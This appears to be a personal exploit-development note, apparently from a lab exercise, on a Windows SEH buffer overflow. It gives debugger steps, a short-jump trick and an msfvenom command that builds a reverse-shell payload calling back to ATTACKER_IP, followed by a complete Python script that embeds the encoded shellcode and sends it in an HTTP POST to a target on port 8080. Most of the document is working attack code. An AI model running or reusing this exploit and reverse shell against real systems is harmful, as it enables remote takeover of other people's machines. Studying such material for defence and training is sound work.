+++
date = '2026-11-15T19:55:20+06:30'
title = 'WinExplDev'
cover = '/images/covers/7.jpeg'
+++

### SEH Bug

test the buffer overflow with many characters and it trigger segfault so time to test seh

```
debug With windbg
!load pykd 
!py C:\Tools\mona mona.py seh -> and then insert in trigger eip to check where is our payload location then if our payload location only have small bytes spaces so we need to do jump short 

```

```bash
nasmshell 
nasm> jmp -660
E967FDFFFF               jmp 0xfffffd6c

nasm> jmp short -8
EBF6                     jmp short 0xfffffff8

here we can do jump trick thats mean double jump -> do first jump -8 to jump -660 then we can get many space to execute our payload
```

After that time to generate shellcode

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -b "\x00\x0a\x0d" LHOST=ATTACKER_IP LPORT=443 -f python
```

```python
import requests
from pwn import * 

host = "10.129.234.171"
port = 8080

content =  b""
content += b"\xdd\xc2\xba\x7f\xe8\x34\x91\xd9\x74\x24\xf4"
content += b"\x5e\x31\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13"
content += b"\x03\x29\xfb\xd6\x64\x29\x13\x94\x87\xd1\xe4"
content += b"\xf9\x0e\x34\xd5\x39\x74\x3d\x46\x8a\xfe\x13"
content += b"\x6b\x61\x52\x87\xf8\x07\x7b\xa8\x49\xad\x5d"
content += b"\x87\x4a\x9e\x9e\x86\xc8\xdd\xf2\x68\xf0\x2d"
content += b"\x07\x69\x35\x53\xea\x3b\xee\x1f\x59\xab\x9b"
content += b"\x6a\x62\x40\xd7\x7b\xe2\xb5\xa0\x7a\xc3\x68"
content += b"\xba\x24\xc3\x8b\x6f\x5d\x4a\x93\x6c\x58\x04"
content += b"\x28\x46\x16\x97\xf8\x96\xd7\x34\xc5\x16\x2a"
content += b"\x44\x02\x90\xd5\x33\x7a\xe2\x68\x44\xb9\x98"
content += b"\xb6\xc1\x59\x3a\x3c\x71\x85\xba\x91\xe4\x4e"
content += b"\xb0\x5e\x62\x08\xd5\x61\xa7\x23\xe1\xea\x46"
content += b"\xe3\x63\xa8\x6c\x27\x2f\x6a\x0c\x7e\x95\xdd"
content += b"\x31\x60\x76\x81\x97\xeb\x9b\xd6\xa5\xb6\xf3"
content += b"\x1b\x84\x48\x04\x34\x9f\x3b\x36\x9b\x0b\xd3"
content += b"\x7a\x54\x92\x24\x7c\x4f\x62\xba\x83\x70\x93"
content += b"\x93\x47\x24\xc3\x8b\x6e\x45\x88\x4b\x8e\x90"
content += b"\x1f\x1b\x20\x4b\xe0\xcb\x80\x3b\x88\x01\x0f"
content += b"\x63\xa8\x2a\xc5\x0c\x43\xd1\x8e\x38\x9e\xc8"
content += b"\x9b\x55\x9c\xea\x22\x1d\x29\x0c\x4e\x71\x7c"
content += b"\x87\xe7\xe8\x25\x53\x99\xf5\xf3\x1e\x99\x7e"
content += b"\xf0\xdf\x54\x77\x7d\xf3\x01\x77\xc8\xa9\x84"
content += b"\x88\xe6\xc5\x4b\x1a\x6d\x15\x05\x07\x3a\x42"
content += b"\x42\xf9\x33\x06\x7e\xa0\xed\x34\x83\x34\xd5"
content += b"\xfc\x58\x85\xd8\xfd\x2d\xb1\xfe\xed\xeb\x3a"
content += b"\xbb\x59\xa4\x6c\x15\x37\x02\xc7\xd7\xe1\xdc"
content += b"\xb4\xb1\x65\x98\xf6\x01\xf3\xa5\xd2\xf7\x1b"
content += b"\x17\x8b\x41\x24\x98\x5b\x46\x5d\xc4\xfb\xa9"
content += b"\xb4\x4c\x36\x31\xa9\xdb\xa1\x1c\x40\xa6\xaf"
content += b"\x9e\xbf\xe5\xc9\x1c\x35\x96\x2d\x3c\x3c\x93"
content += b"\x6a\xfa\xad\xe9\xe3\x6f\xd1\x5e\x03\xba"
content += b"A" * (652 - len(content))
#content = b"A" * (660 - 8)  
content += b"\xe9\x6f\xfd\xff\xff" + b"EEE"   # jmp -652
content += b"\xeb\xf6" + b"BB"                # jmp short -8 
content += p32(0x00409569) 
content += b"C" * 4 
content += b"D" * 4 
# first p32 is use for short jump -> second is for ret to know return address 
payload = b"POST / HTTP/1.1\r\n"
payload += f"Host: {host}\r\n".encode()
payload += b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:160.0) Gecko/20100101 Firefox/160.0\r\n"
payload += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
payload += b"Accept-Language: en-US,en;q=0.9\r\n"
payload += b"Accept-Encoding: gzip, deflate\r\n"
payload += b"Connection: keep-alive\r\n"
payload += b"Upgrade-Insecure-Requests: 1\r\n"
payload += b"Priority: u=0, i\r\n"
payload += b"Content-Length: %d\r\n\r\n" % len(content)
payload += content

HTTP_PROXY = "http://10.129.234.171:8080"
proxies = {"http": HTTP_PROXY, "https": HTTP_PROXY}

headers = {
    "Host": f"{host}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Accept":
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
}

url = f'http://{host}:{port}'


response = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=10)
print(response.status_code)
```